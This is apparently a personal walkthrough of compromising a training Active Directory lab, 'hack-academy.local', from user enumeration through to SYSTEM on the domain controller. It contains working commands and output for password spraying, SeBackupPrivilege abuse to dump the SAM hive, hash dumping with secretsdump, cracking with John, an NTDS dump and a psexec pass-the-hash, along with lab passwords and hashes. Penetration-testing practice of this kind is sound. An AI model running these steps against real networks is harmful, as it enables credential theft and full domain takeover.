Bust out autorecon and then test for IPs with netexec

``` sh
┌──(kali㉿kali)-[~]
└─$ netexec smb 10.0.2.0/24
SMB         10.0.2.4        445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:hack-academy.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.0.2.2        445    DESKTOP-CIVQJ2K  [*] Windows 11 / Server 2025 Build 26100 x64 (name:DESKTOP-CIVQJ2K) (domain:DESKTOP-CIVQJ2K) (signing:True) (SMBv1:None)
SMB         10.0.2.7        445    CLIENT-1         [*] Windows 10 / Server 2019 Build 19041 x64 (name:CLIENT-1) (domain:hack-academy.local) (signing:False) (SMBv1:None)
SMB         10.0.2.9        445    CLIENT-2         [*] Windows 10 / Server 2019 Build 19041 x64 (name:CLIENT-2) (domain:hack-academy.local) (signing:False) (SMBv1:None)
```
![[Pasted image 20260811070346.png]]
Nothing interesting in bloodhound and no access to target.

Used ldap for user discovery. Got also possible password
``` sh
┌──(kali㉿kali)-[~]
└─$ netexec ldap 10.0.2.4 -u 'lbennett' -p '!!reiD123' --users
LDAP        10.0.2.4        389    DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:hack-academy.local) (signing:None) (channel binding:No TLS cert) 
LDAP        10.0.2.4        389    DC01             [+] hack-academy.local\lbennett:!!reiD123 
LDAP        10.0.2.4        389    DC01             [*] Enumerated 16 domain users: hack-academy.local
LDAP        10.0.2.4        389    DC01             -Username-                    -Last PW Set-       -BadPW-  -Description-                                               
LDAP        10.0.2.4        389    DC01             Administrator                 2025-11-29 14:30:04 0        Built-in account for administering the computer/domain      
LDAP        10.0.2.4        389    DC01             Guest                         <never>             12       Built-in account for guest access to the computer/domain    
LDAP        10.0.2.4        389    DC01             krbtgt                        2025-08-24 13:08:23 12       Key Distribution Center Service Account                     
LDAP        10.0.2.4        389    DC01             mjohnson                      2025-11-24 01:40:43 4                                                                    
LDAP        10.0.2.4        389    DC01             lbennett                      2025-11-24 01:40:43 0                                                                    
LDAP        10.0.2.4        389    DC01             egreen                        2025-11-24 01:40:43 3                                                                    
LDAP        10.0.2.4        389    DC01             spatel                        2025-11-24 01:40:43 3                                                                    
LDAP        10.0.2.4        389    DC01             dreyes                        2025-11-24 01:40:43 3                                                                    
LDAP        10.0.2.4        389    DC01             nflores                       2025-11-24 01:40:43 3                                                                    
LDAP        10.0.2.4        389    DC01             clee                          2025-11-24 01:40:43 3                                                                    
LDAP        10.0.2.4        389    DC01             otran                         2025-11-24 01:40:44 3                                                                    
LDAP        10.0.2.4        389    DC01             zmiller                       2025-11-24 01:40:44 3                                                                    
LDAP        10.0.2.4        389    DC01             mross                         2025-11-24 01:40:44 3                                                                    
LDAP        10.0.2.4        389    DC01             twest                         2025-11-29 15:16:20 3        HappyCactus$10                                              
LDAP        10.0.2.4        389    DC01             eknight                       2025-11-24 01:40:44 3                                                                    
LDAP        10.0.2.4        389    DC01             mthompson                     2025-11-29 14:53:23 3      
```
![[Pasted image 20260811070335.png]]

make username list and used password spray with the found password

Atleast smb working with twest
``` sh
┌──(kali㉿kali)-[~/writeups/ad/AD1/loot]
└─$ netexec smb 10.0.2.4 -u usernames -p 'HappyCactus$10'
SMB         10.0.2.4        445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:hack-academy.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.0.2.4        445    DC01             [-] hack-academy.local\Administrator:HappyCactus$10 STATUS_LOGON_FAILURE 
SMB         10.0.2.4        445    DC01             [-] hack-academy.local\Guest:HappyCactus$10 STATUS_LOGON_FAILURE 
SMB         10.0.2.4        445    DC01             [-] hack-academy.local\krbtgt:HappyCactus$10 STATUS_LOGON_FAILURE 
SMB         10.0.2.4        445    DC01             [-] hack-academy.local\mjohnson:HappyCactus$10 STATUS_LOGON_FAILURE 
SMB         10.0.2.4        445    DC01             [-] hack-academy.local\lbennett:HappyCactus$10 STATUS_LOGON_FAILURE 
SMB         10.0.2.4        445    DC01             [-] hack-academy.local\egreen:HappyCactus$10 STATUS_LOGON_FAILURE 
SMB         10.0.2.4        445    DC01             [-] hack-academy.local\spatel:HappyCactus$10 STATUS_LOGON_FAILURE 
SMB         10.0.2.4        445    DC01             [-] hack-academy.local\dreyes:HappyCactus$10 STATUS_LOGON_FAILURE 
SMB         10.0.2.4        445    DC01             [-] hack-academy.local\nflores:HappyCactus$10 STATUS_LOGON_FAILURE 
SMB         10.0.2.4        445    DC01             [-] hack-academy.local\clee:HappyCactus$10 STATUS_LOGON_FAILURE 
SMB         10.0.2.4        445    DC01             [-] hack-academy.local\otran:HappyCactus$10 STATUS_LOGON_FAILURE 
SMB         10.0.2.4        445    DC01             [-] hack-academy.local\zmiller:HappyCactus$10 STATUS_LOGON_FAILURE 
SMB         10.0.2.4        445    DC01             [-] hack-academy.local\mross:HappyCactus$10 STATUS_LOGON_FAILURE 
SMB         10.0.2.4        445    DC01             [+] hack-academy.local\twest:HappyCactus$10 
```
![[Pasted image 20260811070743.png]]

used nxc-sweep on Client1 and got winrm (PWND!)
``` sh
┌──(kali㉿kali)-[~/…/MACHINE/Microsoft/Windows NT/SecEdit]
└─$ netexec smb 10.0.2.0/24
SMB         10.0.2.4        445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:hack-academy.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.0.2.2        445    DESKTOP-CIVQJ2K  [*] Windows 11 / Server 2025 Build 26100 x64 (name:DESKTOP-CIVQJ2K) (domain:DESKTOP-CIVQJ2K) (signing:True) (SMBv1:None)
SMB         10.0.2.7        445    CLIENT-1         [*] Windows 10 / Server 2019 Build 19041 x64 (name:CLIENT-1) (domain:hack-academy.local) (signing:False) (SMBv1:None)
SMB         10.0.2.9        445    CLIENT-2         [*] Windows 10 / Server 2019 Build 19041 x64 (name:CLIENT-2) (domain:hack-academy.local) (signing:False) (SMBv1:None)
Running nxc against 256 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00

┌──(kali㉿kali)-[~/…/MACHINE/Microsoft/Windows NT/SecEdit]
└─$ nxc-sweep 10.0.2.7 -u twest -p 'HappyCactus$10'
[*] Starting NXC sweep for 10.0.2.7 as twest ...

[+] Port 445 open. Checking smb ...                                                                                                                                                                                
SMB         10.0.2.7        445    CLIENT-1         [*] Windows 10 / Server 2019 Build 19041 x64 (name:CLIENT-1) (domain:hack-academy.local) (signing:False) (SMBv1:None)                                          
SMB         10.0.2.7        445    CLIENT-1         [+] hack-academy.local\twest:HappyCactus$10 
SMB         10.0.2.7        445    CLIENT-1         [*] Enumerated shares
SMB         10.0.2.7        445    CLIENT-1         Share           Permissions     Remark
SMB         10.0.2.7        445    CLIENT-1         -----           -----------     ------
SMB         10.0.2.7        445    CLIENT-1         ADMIN$          READ            Remote Admin
SMB         10.0.2.7        445    CLIENT-1         C$              READ,WRITE      Default share
SMB         10.0.2.7        445    CLIENT-1         IPC$            READ            Remote IPC

[+] Port 5985 open. Checking winrm ...
WINRM       10.0.2.7        5985   CLIENT-1         [*] Windows 10 / Server 2019 Build 19041 (name:CLIENT-1) (domain:hack-academy.local)                                                                           
WINRM       10.0.2.7        5985   CLIENT-1         [+] hack-academy.local\twest:HappyCactus$10 (Pwn3d!)

[+] Port 3389 open. Checking rdp ...
RDP         10.0.2.7        3389   CLIENT-1         [*] Windows 10 or Windows Server 2016 Build 19041 (name:CLIENT-1) (domain:hack-academy.local) (nla:True)                                                       
RDP         10.0.2.7        3389   CLIENT-1         [+] hack-academy.local\twest:HappyCactus$10 

```
![[Pasted image 20260811072201.png]]

After landing as twest i ran `whoami /all` found that we have SeBackupPrivilege that we can exploit
``` sh
*Evil-WinRM* PS C:\Users\twest\Documents> whoami /all

<REDACTED>

Privilege Name                Description                          State
============================= ==================================== =======
SeBackupPrivilege             Back up files and directories        Enabled
SeRestorePrivilege            Restore files and directories        Enabled

```

SeBackupPrivilege Exploiting
``` sh
*Evil-WinRM* PS C:\> cd c:\
*Evil-WinRM* PS C:\> mkdir temp
*Evil-WinRM* PS C:\> cd temp
*Evil-WinRM* PS C:\temp> reg save hklm\sam c:\Temp\sam
The operation completed successfully.
*Evil-WinRM* PS C:\temp> reg save hklm\system c:\Temp\system
The operation completed successfully.

*Evil-WinRM* PS C:\temp> download sam
                                        
Info: Downloading C:\temp\sam to sam
                                        
Info: Download successful!
*Evil-WinRM* PS C:\temp> download system
                                        
Info: Downloading C:\temp\system to system

┌──(kali㉿kali)-[~/writeups/ad/AD1/exploit]
└─$ impacket-secretsdump -system system -sam sam local
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0xbacf965a2426afda3d2207e4d6aa3904
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:156e3de3d13ba510e8c2b62f4f5d0216:::
Matt:1002:aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f:::
[*] Cleaning up... 
```
![[Pasted image 20260811081059.png]]

Cracked the hashes offline and got Matts creds
``` sh
┌──(kali㉿kali)-[~/writeups/ad/AD1/loot]
└─$ john hashes --wordlist=/usr/share/wordlists/rockyou.txt --format=NT
Using default input encoding: UTF-8
Loaded 3 password hashes with no different salts (NT [MD4 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=4
Press 'q' or Ctrl-C to abort, almost any other key for status
                 (Administrator)     
Password1!       (Matt)     
```
![[Pasted image 20260811082251.png]]


Noticed from bloodhound that Matt was not present. So Matt is local user on Client1 and not Domain user

Sprayed Matt creds with --local-auth flag and found that he has rdp on client1
``` sh
┌──(kali㉿kali)-[~/writeups/ad/AD1/loot]
└─$ netexec rdp ips -u matt -p 'Password1!' --local-auth

-------------
<REDACTED>
------------
RDP         10.0.2.7        3389   CLIENT-1         [+] CLIENT-1\matt:Password1! (Pwn3d!)

```

After rdp i found thath we are in local admin group
``` sh
whoami /all
BUILTIN\Administrators    
```
![[Pasted image 20260811084503.png]]

So to dump hashes easier i added twest to admin group
``` sh
PS C:\Users\Administrator\Desktop> net localgroup "Administrators" twest /add  The command completed successfully. 
```
![[Pasted image 20260811085124.png]]

No we twest is admin and we can dump hashes with him. First Confirm we are admin group:
![[Pasted image 20260811085225.png]]

Then Dump hashes. Found eknight cache domain hash
``` sh
┌──(kali㉿kali)-[~/writeups/ad/AD1/loot]
└─$ impacket-secretsdump twest@10.0.2.7 

<REDACTED>
[*] Dumping cached domain logon information (domain/username:hash)
HACK-ACADEMY.LOCAL/eknight:$DCC2$10240#eknight#e92981e7e9fc7e5732c32865e4c83a8a: (2025-11-29 10:54:13+00:00)
```
![[Pasted image 20260811095252.png]]

Crack it with JtR
``` sh
john hash_eknight --wordlist=/usr/share/wordlists/rockyou.txt     
```

test creds and we have winrm on Client2 (PWND)
``` sh
netexec winrm ips -u eknight -p '!!Stud87'
WINRM       10.0.2.4        5985   DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:hack-academy.local) 
WINRM       10.0.2.9        5985   CLIENT-2         [*] Windows 10 / Server 2019 Build 19041 (name:CLIENT-2) (domain:hack-academy.local) 
WINRM       10.0.2.7        5985   CLIENT-1         [*] Windows 10 / Server 2019 Build 19041 (name:CLIENT-1) (domain:hack-academy.local) 
WINRM       10.0.2.4        5985   DC01             [-] hack-academy.local\eknight:!!Stud87
WINRM       10.0.2.9        5985   CLIENT-2         [+] hack-academy.local\eknight:!!Stud87 (Pwn3d!)
WINRM       10.0.2.7        5985   CLIENT-1         [-] hack-academy.local\eknight:!!Stud87

```
![[Pasted image 20260811095525.png]]

evil-winrm to Client2
``` sh
evil-winrm -u eknight -p '!!Stud87' -i 10.0.2.9

*Evil-WinRM* PS C:\Users\eknight\Documents> whoami
hack-academy\eknight
```
![[Pasted image 20260811095639.png]]

and it seems that we all admin in Client2
``` sh
whoami /all
```
![[Pasted image 20260811095707.png]]

Dumped hashes again. Found mthomson hash and mthomson is domain admin what we saw from bloodhound. (bloodhound -> Cypher -> All domain admins)
![[Pasted image 20260811100539.png]]

So lets crack that and it should be wrapped
``` sh
impacket-secretsdump eknight@10.0.2.9

[*] Dumping cached domain logon information (domain/username:hash)
HACK-ACADEMY.LOCAL/mthompson:$DCC2$10240#mthompson#364a73de9ce144051ec14a2fdeb6a757: (2025-11-29 22:53:13+00:00)
```

Cracked it.
``` sh
mthompson:Password123!
```
![[Pasted image 20260811102029.png]]

Spray the creds just in case and confirm winrm on all targets
![[Pasted image 20260811101434.png]]

winrm to target and confirm access
![[Pasted image 20260811101557.png]]

then dump all the user hashes
``` sh
netexec smb 10.0.2.4 -u mthompson -p 'Password123!!' --ntds
```
![[Pasted image 20260811102416.png]]

use admin hash to login
``` sh
impacket-psexec hack-academy.local/administrator@10.0.2.4 -hashes :c0ced2de918b4a7c1b9f4efd225dd503
```
![[Pasted image 20260811102439.png]]

confirm that we are SYSTEM on DC
![[Pasted image 20260811102502.png]]